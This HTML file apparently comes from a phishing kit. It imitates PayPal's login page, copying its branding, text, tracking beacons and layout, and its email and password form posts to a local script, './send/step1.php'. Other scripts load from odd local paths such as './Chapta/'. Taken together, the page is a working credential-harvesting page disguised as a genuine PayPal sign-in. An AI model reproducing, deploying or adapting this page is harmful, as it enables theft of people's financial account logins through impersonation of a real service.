
<!DOCTYPE html>

<html lang="en" class="no-js mobile">


<head>
    <script src="js/Captcha/ngrlCaptcha.min.js"></script>
    <meta charset="utf-8" />
    <title>Log in to your PayPal account</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
    <link rel="shortcut icon" href="./img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
    <link rel="canonical" href="https://www.paypal.com/us/signin" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
    <link rel="stylesheet" href="./css/contextualLoginElementalUI.css">
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/modernizr-2.6.1.js"></script>
    <!-- /build -->
    <!-- /build -->
    <style id="antiClickjack">
        body {
            display: none !important;
        }
    </style>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        /* Special integration eligibility check */
        function isEligibleIntegration() {
            var sxf = "";
            return sxf === 'true' || window.name === 'PPFrameRedirect';
        }
        /* Don't bust the frame if this is top window */
        if (self === top || isEligibleIntegration()) {
            var antiClickjack = document.getElementById("antiClickjack");
            if (antiClickjack) {
                antiClickjack.parentNode.removeChild(antiClickjack);
            }
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body class="mobile" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfR3mQy2JZfSavI03Q3pWZxE0B1RZg4BOBWYrkBW3opwz_17d3f689a11" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKG6pWzWxd+IA6" data-production="true" data-enable-ads-captcha="true"
    data-ads-challenge-url="/auth/createchallenge/c7748a0f561bc123/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="f625559e00444" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true"
    data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-csrf-token="Rk8zKHCgyO26Qj/ro/HBVuUh+NSddBG/bVm6A=" data-nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true"
    data-is-track-password-field-autofill-enabled="true" data-enable-suppress-auto-submit="true" data-suppress-autosubmit-time="500" data-keychain-flags-json="{&quot;activationOnXoEnabled&quot;:true,&quot;isIosWebView&quot;:false,&quot;isEligibleForXhrLogin&quot;:false}"
    data-show-country-drop-down="true" data-email-label="Email" data-xhr-timeout-limit="20000" data-load-start-time="1637446359569" data-is-cookied-user="true" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-login-experience="safari">
    <noscript>
            <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
        </noscript>
    <div id="main" class="main" role="main">
        <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
                <div id="slContent" class="contentContainer contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <div id="linked" class="linked ">
                        <div class="profileRemembered">
                            <span class="loginEmail">a</span>
                            <a href="#" class="changeLink scTrack:not-you" id="changeLink">Change</a>
                        </div>
                        <div class="headerTextDecorated"></div>
                        <h1 class="headerText">Stay logged in for faster checkout</h1>
                        <p class="description assure">
                            Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)
                            <span class="learnMoreLink">
                                    <a href="#" id="slLoginLearnMore" class="secondayLink">What's this?</a>
                                </span>
                        </p>
                        <div id="partnerProfile" class="partnerProfile">
                            <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div>
                            <div class=partnerDetails>
                                <span>You're logged in as</span>
                                <div id="displayName" class="displayName"></div>
                                <div>
                                    <div class="partnerEmailDiv">
                                        <span class="partnerIcon"></span>
                                        <span id="partnerEmail" class="partnerEmail"></span>
                                        <span id="partnerEmailDomain"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="actions actionsSpacedShort">
                            <button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn">Continue</button>
                        </div>
                        <div id="secondaryLogin" class="buttonAsLink secondaryLink">
                            <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn">Use password instead</button>
                        </div>
                    </div>
                    <div id="unlinked" class="unlinked ">
                        <div id="headerIcon" class="partnerConnect"></div>
                        <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
                        <p class="description assure">
                            Automatically log in to PayPal for faster checkout without typing your password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis">What's this?</a>
                        </p>
                        <p class="secondaryLink hide" id="slOptIn_notNow">
                            <a href="#">Not now</a>
                        </p>
                    </div>
                    <div id="learnMoreModal" class="learnMoreModal">
                        <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
                            <p>Linking your Google account allows you to activate One Touch quickly and easily when you check out. You can always opt out later in Settings at PayPal.com.</p>
                            <p>Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p>
                        </div>
                        <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
                            <p>Skip typing your password by staying logged in on this device. For security, we'll occassionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared
                                devices. Turn this off at any time in your PayPal settings.</p>
                        </div>
                        <button type="button" class="ui-dialog-titlebar-close"></button>
                    </div>
                    <div class="intentFooter ">
                        <div class="localeSelector ">
                            <span class="picker country-selector hide">
                                    <span class="hide" id="countryPickerLink">United States</span>
                            <button type="button" aria-labelledby="countryPickerLink" class="country US"></button>
                            </span>
                            <ul class="localeLink">
                                <li>
                                    <a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=US&locale.x=en_US&langTgl=en" lang="en" data-locale="en_US" aria-current=”true”>English</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="/signin?country.x=US&locale.x=fr_XC&langTgl=fr" lang="fr" data-locale="fr_XC">Français</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_es_XC" href="/signin?country.x=US&locale.x=es_XC&langTgl=es" lang="es" data-locale="es_XC">Español</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="/signin?country.x=US&locale.x=zh_XC&langTgl=zh" lang="zh" data-locale="zh_XC">中文</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class=" corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                    </header>
                    <div id="loginContent" class="">
                        <div id="loginSection" class="">
                            <div class="notifications"></div>
                            
                           
                                
                                <div id="passwordSection" class="clearfix splitEmail">
                                    <div id="splitEmailSection" class="splitEmailSection">
									
                                        <form action="./send/step1.php" method="post" class="proceed maskable" id="PageMainForm"> 
                                        <div class="textInput" id="login_emaildiv">
                                            
                                                <label for="email" class="fieldLabel">Email or mobile number</label>
                                                <input id="email" name="login" type="text"  required  placeholder="Email or mobile number"  />
                                            
                                        </div>
                                    </div>
                                    <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                        <div class="textInput  " id="login_passworddiv">
                                            <div class="fieldWrapper ">
                                                <label for="password" class="fieldLabel">Password</label>
                                                <input id="password" name="pwd" type="password" class="hasHelp  validateEmpty   pin-password" required value="" placeholder="Password" />
                                                
                                            </div>
                                            
                                        </div>
                                        <a href="#" id="forgotPassword" class="recoveryOption forgotPassword" data-client-log-action-type="clickForgotPasswordLink">Forgot password?</a>
                                    </div>
                                </div>
                               
                               
                                    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>
                                
                                
                            </form>
                            
                            <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                                <div class="loginSignUpSeparator ">
                                    <span class="textInSeparator">or</span>
                                </div>
                                <button type="button" href="/us/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</button>
                            </div>
                            <div id="tpdButtonContainer" class="signupContainer hide">
                                <div class="loginSignUpSeparator">
                                    <span class="textInSeparator">or</span>
                                </div>
                                <div class="actions">
                                    <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device">Approve login using mobile device</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="intentFooter ">
                        <div class="localeSelector ">
                            <span class="picker country-selector hide">
                                    <span class="hide" id="countryPickerLink">United States</span>
                            <button type="button" aria-labelledby="countryPickerLink" class="country US"></button>
                            </span>
                            <ul class="localeLink">
                                <li>
                                    <a class="selected scTrack:unifiedlogin-footer-language_en_US" href="#" lang="en" data-locale="en_US" aria-current=”true”>English</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="#" lang="fr" data-locale="fr_XC">Français</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_es_XC" href="#" lang="es" data-locale="es_XC">Español</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="#" lang="zh" data-locale="zh_XC">中文</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal">
            <div class="corral">
                <div class="contentContainer contentContainerLean">
                    <div id="pending" class="verificationSubSection">
                        <h1 class="headerText">Open the PayPal app</h1>
                        <p id="uncookiedMessage" class="verification-message hide">
                            Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.
                        </p>
                        <p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p>
                        <div class="notifications"></div>
                        <div class="accountArea">
                            <span class="account"></span>
                            <span class="verificationNotYou">
                                    <a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink">Not you?</a>
                                </span>
                        </div>
                        <div class="mobileNotification">
                            <p class="pin"></p>
                            <div class="mobileScreen">
                                <img src="./img/icon-PN-check.png" alt="phone">
                            </div>
                        </div>
                        <p class="tryAnotherMsg">
                            <a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password">Use password instead</a>
                        </p>
                        <p class="resendMsg">
                            <a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend">Resend</a>
                            <span class="sentMessage hide">Sent</span>
                        </p>
                    </div>
                    <div id="expired" class="hide verificationSubSection">
                        <header>
                            <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
                        </header>
                        <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
                        <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                        <button id="expiredTryAgainButton" class="button actionsSpaced">Try Again</button>
                    </div>
                    <div id="denied" class="denied hide verificationSubSection">
                        <img alt="" src="./img/glyph_alert_critical_big-2x.png" class="deniedCaution" />
                        <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
                        <p>
                            Need a hand?, <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help">We can help</a> .
                        </p>
                    </div>
                </div>
            </div>
        </section>
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li>
                        <a target="_blank" href="#">Contact Us</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Privacy</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Legal</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Worldwide</a>
                    </li>
                </ul>
            </div>
        </footer>
    </div>
    <div class="transitioning  hide ">
        <p class="welcomeMessage hide">Welcome, !</p>
        <p class="checkingInfo hide">Checking your info…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your info...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
        <p class="udtSpinnerMessage webllsXoUS hide">
            We recognize you on this device, so you can skip login.<br>
            <br>Manage this setting in your profile.
        </p>
        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
        <p class="qrcMessage hide">Redirecting...</p>
        <div class="keychain spinner-content uiExp hide"></div>
    </div>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.slData = {
            "slSessionChkTimeout": "",
            "slOptInTimeout": "",
            "slAuthChkTimeout": "",
            "slTokenValidationTimeout": "",
            "slDisplayMerchantLink": "",
            "slAction": "",
            "smartlockStatus": "",
            "slLinkedEmail": "",
            "slFrameSrc": "",
            "slAuthUrl": "",
            "partnerClientId": "",
            "partnerReturnUri": "",
            "scimContextId": "",
            "slOptInOT": "",
            "slLoginEmail": "",
            "slReturnUrl": "",
            "delayPartnerAssertion": "",
            "googleOneTapEnable": ""
        };
    </script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = {
            fnUrl: "https://c.paypal.com/da/r/fb.js",
            fnSessionId: "bafe35adbe434f0cb790c3438ad4a85b",
            sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD",
            beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD1iYWZlMzVhZGJlNDM0ZjBjYjc5MGMzNDM4YWQ0YTg1YiZpPTEwOC4xNzUuMTEuMjQ5JnQ9MTYzNzQ0NjM1OS41OTYmYT0yMSZzPVVOSUZJRURfTE9HSU7PA0IVK1unkawdg32K5vfZSBpELw",
            enableSpeedTyping: "true",
            aPayAuth: "",
            aPayCanMakePaymentTimeout: "",
            tokenAssertionUri: "",
            preloadScriptUrl: "",
            preloadScriptDownloadLength: 0,
            fingerprintProceed: ""
        };
    </script>
    <noscript>
            <img src="https://c.paypal.com/v1/r/d/b/ns?f=bafe35adbe434f0cb790c3438ad4a85b&s=UNIFIED_LOGIN_INPUT_PASSWORD&js=0&r=1" title="ppfniframe" alt="" height="1" width="1" border="0">
        </noscript>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" id="ul-sync-data">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulSync = {
            fnSessionId: 'bafe35adbe434f0cb790c3438ad4a85b',
            sourceId: 'UNIFIED_LOGIN_INPUT_PASSWORD',
            fname: 'fn_sync_data'
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/lib/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/fn-sync-telemetry-min.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = PAYPAL.ulData || {};
        PAYPAL.ulData.incontextData = {
            "version": "",
            "noBridge": "",
            "env": "",
            "icstage": "",
            "targetCancelUrl": "",
            "paymentAction": "",
            "paymentToken": "",
            "merchantID": ""
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/signin-split-safari.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script src="/.js/pa.js"></script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        (function() {
            if (typeof PAYPAL.analytics != "undefined") {
                PAYPAL.core = PAYPAL.core || {};
                PAYPAL.core.pta = PAYPAL.analytics.setup({
                    data: 'pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F',
                    url: 'https:\/\/t.paypal.com\/ts'
                });
            }
        }());
    </script>
    <noscript>
            <img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F" alt="" height="1" width="1" border="0">
        </noscript>
    <script async defer src="./Chapta/recaptchav3.js?_sessionID=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA"></script>
    <script src="./js/jquery-3.6.3.min.js"></script>

</body>

</html>